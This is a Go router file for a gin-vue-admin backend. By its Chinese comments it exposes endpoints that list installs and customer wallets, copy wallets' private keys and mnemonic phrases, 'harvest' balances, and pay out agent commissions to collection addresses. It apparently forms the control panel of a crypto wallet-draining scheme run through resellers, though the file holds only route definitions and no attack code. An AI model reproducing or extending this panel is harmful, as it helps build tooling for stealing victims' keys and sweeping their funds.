package system

import (
	"github.com/flipped-aurora/gin-vue-admin/server/api/v1/system"
	"github.com/gin-gonic/gin"
)

type DeviceRouter struct{}

func (d *DeviceRouter) InitDeviceRouter(Router *gin.RouterGroup) {
	deviceRouter := Router.Group("device")
	qkApi := system.QianKeApi{}
	{
		deviceRouter.POST("list", qkApi.DeviceList)                                   //安装列表
		deviceRouter.POST("agent_device_list", qkApi.AgentDeviceList)                 //代理安装列表
		deviceRouter.GET("agent_list", qkApi.DeviceAgentList)                         //安装列表里面的代理商列表
		deviceRouter.POST("wallet_list", qkApi.WalletList)                            //总后台 wallet 信息
		deviceRouter.POST("custom_wallet_list", qkApi.CustomWalletList)               //客户 wallet 信息
		deviceRouter.POST("agent_wallet_list", qkApi.AgentWalletList)                 //代理商 wallet 信息
		deviceRouter.POST("private_wallet_list", qkApi.PrivateWalletList)             //私域 wallet 信息
		deviceRouter.POST("copy_private", qkApi.CopyPrivate)                          //复制私钥 助记词
		deviceRouter.POST("wallet_balance_list", qkApi.WalletBalanceList)             //钱包余额
		deviceRouter.POST("shougei", qkApi.ShouGe)                                    //收割
		deviceRouter.POST("rk", qkApi.Rk)                                             //入库
		deviceRouter.POST("hf", qkApi.Hf)                                             //恢复
		deviceRouter.POST("update_wallet_balance", qkApi.UpdateWalletBalance)         //更新余额
		deviceRouter.POST("financial", qkApi.Financial)                               //总后台 财务管理
		deviceRouter.POST("custom_financial", qkApi.CustomFinancial)                  //客户 财务管理
		deviceRouter.POST("agent_financial", qkApi.AgentFinancial)                    //代理 财务管理
		deviceRouter.GET("token_list", qkApi.TokenList)                               //主链，代币详情
		deviceRouter.POST("agent_tabulation", qkApi.AgentTabulation)                  //代理商列表
		deviceRouter.GET("payment_address", qkApi.PaymentAddress)                     //客户和代理收款地址
		deviceRouter.GET("agent_payment_address", qkApi.AgentPaymentAddress)          //代理收款地址
		deviceRouter.POST("add_payment_address", qkApi.AddPaymentAddress)             //添加收款地址(客户和代理)
		deviceRouter.POST("modify_payment_address", qkApi.ModifyPaymentAddress)       //修改收款地址(客户和代理)
		deviceRouter.POST("add_packet", qkApi.AddPacket)                              //添加项目
		deviceRouter.GET("packet_list", qkApi.PacketList)                             //项目列表
		deviceRouter.GET("system_address", qkApi.SystemAddressInfo)                   //系统,私域地址
		deviceRouter.POST("add_commission_address", qkApi.AddCommissionAddress)       //添加系统,私域地址
		deviceRouter.POST("modify_commission_address", qkApi.ModifyCommissionAddress) //修改系统,私域地址
		deviceRouter.POST("add_agent", qkApi.AddAgent)                                //添加代理商
		deviceRouter.GET("get_packet_info", qkApi.GetPacketInfo)                      //添加代理商里面的项目
		deviceRouter.GET("get_index_info", qkApi.GetIndexInfo)                        //首页信息
	}
}
